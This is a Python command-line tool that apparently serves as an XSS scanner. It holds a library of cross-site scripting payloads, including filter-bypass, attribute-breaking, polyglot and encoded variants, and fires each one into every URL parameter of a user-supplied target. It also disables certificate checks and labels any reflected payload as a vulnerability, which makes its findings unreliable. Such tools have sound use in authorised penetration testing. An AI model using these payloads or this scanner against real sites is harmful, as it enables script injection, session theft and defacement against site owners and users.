#!/usr/bin/env python3
"""
XSS Payload Injector
Advanced Cross-Site Scripting (XSS) vulnerability detection tool
"""

import requests
import urllib.parse
import re
from html import unescape
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run():
    print("\033[92m" + "="*70)
    print("           XSS PAYLOAD INJECTOR - Cross-Site Scripting Tester")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test applications you own or have permission to test!\033[0m\n")
    
    # Comprehensive XSS Payload Library
    XSS_PAYLOADS = {
        'basic': [
            '<script>alert("XSS")</script>',
            '<script>alert(1)</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>'
        ],
        'filter_bypass': [
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<ScRiPt>alert(1)</sCrIpT>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror="alert`1`">',
            '<svg><script>alert&#40;1&#41;</script>',
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
            '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<iframe src=javascript:alert(1)>',
            '<object data="javascript:alert(1)">',
        ],
        'attribute_based': [
            '" onload="alert(1)',
            '\' onload=\'alert(1)',
            '"></script><script>alert(1)</script>',
            '\'></script><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '\' autofocus onfocus=alert(1) \'',
            '" autofocus onfocus=alert(1) "',
            '\'/><script>alert(1)</script>',
            '"/><script>alert(1)</script>',
        ],
        'event_handlers': [
            '<img src=x onerror=alert(1)>',
            '<img src=x onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<div onmouseover=alert(1)>hover</div>',
            '<a onmouseover=alert(1)>hover</a>',
        ],
        'dom_based': [
            '#<script>alert(1)</script>',
            '?<script>alert(1)</script>',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '<script>eval(location.hash.slice(1))</script>',
            '<script>document.write(location.hash)</script>',
        ],
        'polyglot': [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//',
            '\'"><img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            '\'"--></style></script><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        ],
        'encoded': [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
            '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
        ]
    }
    
    # Detection patterns
    XSS_REFLECTION_PATTERNS = [
        r'<script[^>]*>.*?alert.*?</script>',
        r'<img[^>]*onerror\s*=',
        r'<svg[^>]*onload\s*=',
        r'<body[^>]*onload\s*=',
        r'<iframe[^>]*src\s*=\s*["\']?javascript:',
        r'onerror\s*=\s*["\']?alert',
        r'onload\s*=\s*["\']?alert',
        r'onfocus\s*=\s*["\']?alert',
        r'javascript:\s*alert',
        r'<script>',
        r'alert\(',
    ]
    
    target_url = input("\033[97m[?] Enter target URL (e.g., http://site.com/page?search=test): \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    print("\n\033[97m[*] Testing Options:\033[0m")
    print("  [1] Quick Scan (Basic payloads)")
    print("  [2] Standard Scan (Basic + Filter bypass)")
    print("  [3] Advanced Scan (All payload types)")
    print("  [4] Custom Payload Test")
    print("  [5] Polyglot Payloads Only")
    
    choice = input("\n\033[95m[?] Select scan type: \033[0m").strip()
    
    # Parse URL
    parsed = urllib.parse.urlparse(target_url)
    params = urllib.parse.parse_qs(parsed.query)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    if not params:
        print("\033[91m[!] No parameters found in URL.\033[0m")
        return
    
    print(f"\n\033[92m[*] Target: {base_url}\033[0m")
    print(f"\033[97m[*] Parameters: {list(params.keys())}\033[0m\n")
    
    vulnerabilities = []
    
    def test_xss_payload(param_name, payload, payload_type):
        """Test a single XSS payload"""
        try:
            # Prepare test parameters
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            # Build request
            query_string = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            
            # Send request
            response = requests.get(test_url, timeout=10, verify=False, allow_redirects=True)
            
            # Check for reflected payload
            response_text = response.text.lower()
            payload_lower = payload.lower()
            
            # Direct reflection check
            if payload in response.text or payload_lower in response_text:
                # Check if it's in executable context
                for pattern in XSS_REFLECTION_PATTERNS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        return {
                            'vulnerable': True,
                            'param': param_name,
                            'payload': payload,
                            'type': payload_type,
                            'evidence': 'Payload reflected in executable context',
                            'url': test_url,
                            'context': 'Reflected XSS'
                        }
                
                # Partial reflection
                return {
                    'vulnerable': True,
                    'param': param_name,
                    'payload': payload,
                    'type': payload_type,
                    'evidence': 'Payload reflected (potential XSS)',
                    'url': test_url,
                    'context': 'Possible XSS'
                }
            
            # Check for decoded/unescaped reflection
            unescaped = unescape(response.text)
            if payload in unescaped:
                return {
                    'vulnerable': True,
                    'param': param_name,
                    'payload': payload,
                    'type': payload_type,
                    'evidence': 'Payload reflected after HTML decoding',
                    'url': test_url,
                    'context': 'Reflected XSS (decoded)'
                }
            
            return None
            
        except Exception as e:
            return None
    
    # Select payloads
    payloads_to_test = []
    
    if choice == '1':
        payloads_to_test = [(pt, p) for pt in ['basic'] for p in XSS_PAYLOADS[pt]]
    elif choice == '2':
        payloads_to_test = [(pt, p) for pt in ['basic', 'filter_bypass'] for p in XSS_PAYLOADS[pt]]
    elif choice == '3':
        payloads_to_test = [(pt, p) for pt, payloads in XSS_PAYLOADS.items() for p in payloads]
    elif choice == '4':
        custom = input("\033[97m[?] Enter custom XSS payload: \033[0m").strip()
        if custom:
            payloads_to_test = [('custom', custom)]
    elif choice == '5':
        payloads_to_test = [('polyglot', p) for p in XSS_PAYLOADS['polyglot']]
    else:
        print("\033[91m[!] Invalid choice.\033[0m")
        return
    
    print(f"\n\033[92m[*] Starting XSS testing with {len(payloads_to_test)} payloads...\033[0m")
    print("\033[93m[*] This may take a while...\033[0m\n")
    
    tested = 0
    total_tests = len(payloads_to_test) * len(params)
    
    for param_name in params.keys():
        print(f"\033[96m[*] Testing parameter: {param_name}\033[0m")
        
        for payload_type, payload in payloads_to_test:
            tested += 1
            print(f"\r\033[97m[*] Progress: {tested}/{total_tests} payloads tested\033[0m", end='', flush=True)
            
            result = test_xss_payload(param_name, payload, payload_type)
            
            if result and result['vulnerable']:
                vulnerabilities.append(result)
                print(f"\n\033[91m[!] XSS VULNERABILITY FOUND!\033[0m")
                print(f"    \033[93mParameter: {result['param']}\033[0m")
                print(f"    \033[93mType: {result['type']}\033[0m")
                print(f"    \033[93mContext: {result['context']}\033[0m")
                print(f"    \033[93mPayload: {result['payload'][:60]}...\033[0m\n")
            
            time.sleep(0.1)
    
    print("\n")
    
    # Results
    print(f"\n\033[92m{'='*70}\033[0m")
    print(f"\033[92m[*] XSS Testing Complete\033[0m")
    print(f"\033[92m{'='*70}\033[0m\n")
    
    if vulnerabilities:
        print(f"\033[91m[!] FOUND {len(vulnerabilities)} POTENTIAL XSS VULNERABILITIES!\033[0m\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"\033[93m[{i}] Parameter: {vuln['param']}\033[0m")
            print(f"    Type: {vuln['type']}")
            print(f"    Context: {vuln['context']}")
            print(f"    Payload: {vuln['payload'][:80]}")
            print(f"    Evidence: {vuln['evidence']}\n")
        
        # Save results
        save = input("\033[95m[?] Save results to file? (y/n): \033[0m").strip().lower()
        if save == 'y':
            filename = input("\033[97m[?] Filename (default: xss_results.txt): \033[0m").strip() or "xss_results.txt"
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"XSS Testing Results\n{'='*70}\n")
                    f.write(f"Target: {target_url}\n")
                    f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                    
                    for vuln in vulnerabilities:
                        f.write(f"Parameter: {vuln['param']}\n")
                        f.write(f"Type: {vuln['type']}\n")
                        f.write(f"Context: {vuln['context']}\n")
                        f.write(f"Payload: {vuln['payload']}\n")
                        f.write(f"URL: {vuln['url']}\n")
                        f.write(f"{'-'*70}\n\n")
                
                print(f"\033[92m[*] Results saved to {filename}\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Error: {str(e)}\033[0m")
    else:
        print(f"\033[92m[*] No XSS vulnerabilities detected.\033[0m")
    
    print(f"\n\033[97m[*] Total tests: {tested}\033[0m\n")

if __name__ == "__main__":
    run()
